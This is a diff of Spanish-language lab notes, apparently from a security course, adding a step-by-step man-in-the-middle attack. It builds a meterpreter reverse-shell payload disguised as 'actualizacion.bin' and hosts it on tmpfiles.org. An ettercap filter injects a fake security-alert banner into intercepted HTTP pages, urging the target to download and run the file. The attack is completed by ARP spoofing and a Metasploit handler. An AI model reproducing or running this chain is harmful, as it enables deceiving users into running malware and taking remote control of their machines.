@@ -813,13 +813,12 @@ ettercap -Tq -i ens33 -P remote_browser -M arp:remote /10.11.48.175// /10.11.48.
 ```
 
 
-4. La víctima usará el navegador para buscar algo (usar el navegador puesto en el fichero del ettercap). Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa página, nosotros también deberíamos entrar.
+4. La víctima usará el navegador para buscar algo (usar el navegador puesto en el fichero del ettercap). Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa página, nosotros también deberíamos entrar. **Usar w3m en la defensa**.
 ```bash
 w3m www.google.com
 ````
 
-Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa
-página, nosotros también deberíamos entrar.
+Si todo va bien, deberíamos haber entrado en la misma página que la víctima. Si hace click en un enlace dentro de esa página, nosotros también deberíamos entrar.
 
 Nos redirige a la misma página que la víctima buscó y la vemos en nuestra pantalla. Pero no es un escritorio remoto, solo nos redirige a sus búsquedas pero no muestra su pantalla en tiempo real ni lo que está haciendo, pero si podemos ver las páginas a las que accede.
 
@@ -834,10 +833,34 @@ Elimino splunk e instalo metasploit. No dejarlo activo por defecto. Arrancarlo s
 
 Metasploit es un framework (conjunto de herramientas) para desarrollar, probar y ejecutar exploits y payloads contra sistemas. Es muy usado en seguridad informática para pruebas de penetración y análisis.
 
+1- Instalación de metasploit:
+```bash
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall
+./msfinstall
+```
+
+  -  Para abrir Metasploit
+```bash
+msfconsole
+```
+  - O en modo silencioso (sin banner)
+```bash
+msfconsole -q
+```
+
+Para salir simplemente **exit** o **Ctrl+D**.
 
 
+<br>
 
-Como atacanntes vamos a engañar a la víctima para que lea un pdf. Es la víctima la que se conecta al ssh.
+2- Payload:
+    Exploit = La llave que abre la cerradura (vulnerabilidad)
+    Payload = Lo que haces después de entrar (código que se ejecuta)
+Un payload en Metasploit es la parte del exploit que se ejecuta en el sistema objetivo después de que una vulnerabilidad ha sido explotada con éxito.
+
+
+Como atacantes vamos a engañar a la víctima para que lea un pdf. Es la víctima la que se conecta al ssh.
 Buscar los comandos en wireshark, o darle a las flechas hasta que aparezca el que queramos.
 
 Tenemos que darle permisos al fichero que le mandamos a nuestro compañero.
@@ -847,6 +870,8 @@ Hay que usar meterpreter, que usa comandos distintos. Tenemos que saber que coma
 
 Una vez que sabemos que funciona metasploit, tenemos que hacer el filtro de ettercap (si encuentras un tag de este estilo, cambialo por eso otro -> tendremos que hacer esto en un html). Tenemos que usar ingenieria social. Tenemos que hacer que nuestro compañero entre en algo que trampa que le mandemos.
 
+En cuanto al fichero, tiene que descargarse algo que funcione. No poner un dropbox ni drive ni nada de eso. NUBE  ni de coña!!!!!
+
 
 **Ingeniería Social**:
 Creamos una ventanita en la que la víctima tiene que entrar. Va abrir un html normal y luego hacemos que funcione el ettercap.
@@ -854,13 +879,72 @@ Creamos una ventanita en la que la víctima tiene que entrar. Va abrir un html n
 1-Primero tiene que funcionar metasploit.
 2-Luego ya tenemos que usar ettercap.
 
+<br>
+
+**PASOS**:
+
+1-Creamos payload:
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.11.48.202 LPORT=4444 -f elf > actualizacion.bin
+```
+
+2-Permisos
+```bash
+chmod +x actualizacion.bin
+```
 
 
-En cueanto al fichero, tiene que descragarse algo que funcione. No poner un dropbox ni drive ni nada de eso. NUBE  ni de coña!!!!!
+3-Subir el payload a Internet:
+```bash
+curl -F "file=@actualizacion.bin" https://tmpfiles.org/api/v1/upload
+```
+o manualmente en  tmpfiles.org
 
 
+4-Crear el filtro ettercap:
+```html:
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+        replace("Accept-Encoding", "Accept-Rubbish!");
+        msg("###### Eliminando compresión ######\n");
+    }
+}
 
+if (ip.proto == TCP && tcp.src == 80) {
+    replace("</body>", "</body><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualización crítica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Después: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
+    replace("</BODY>", "</BODY><div style='position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:15px;text-align:center;z-index:9999;font-family:Arial;font-size:16px;'><h2>⚠️ ALERTA DE SEGURIDAD</h2><p><b>Actualización crítica requerida:</b> Ejecute este parche inmediatamente</p><a href='http://tmpfiles.org/5766984/actualizacion.bin' style='background:white;color:red;padding:10px;text-decoration:none;font-weight:bold;margin:10px;display:inline-block;'>🔒 DESCARGAR PARCHE</a><p style='font-size:12px;'>Después: chmod +x actualizacion.bin && ./actualizacion.bin</p></div>");
+}
+```
 
+5-Compilarlo:
+```bash
+etterfilter filtro.filter -o filtro.ef
+```
+
+6-Permite que el tráfico pase a través de tu máquina (importante para el ataque Man-in-the-Middle).
+```bash
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+**ATAQUE**:
+En una terminal:
+
+7-Ejecutar Ettercap
+```bash
+ettercap -T -i eth0 -M arp:remote /10.11.48.175/ // -F filtro.ef
+```
+
+En otra terminal:
+
+8-Abrir metasploit:
+```bash
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10  # Tu IP
+set LPORT 4444
+exploit
+```
 
 <br>
 <br>
@@ -1035,6 +1119,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
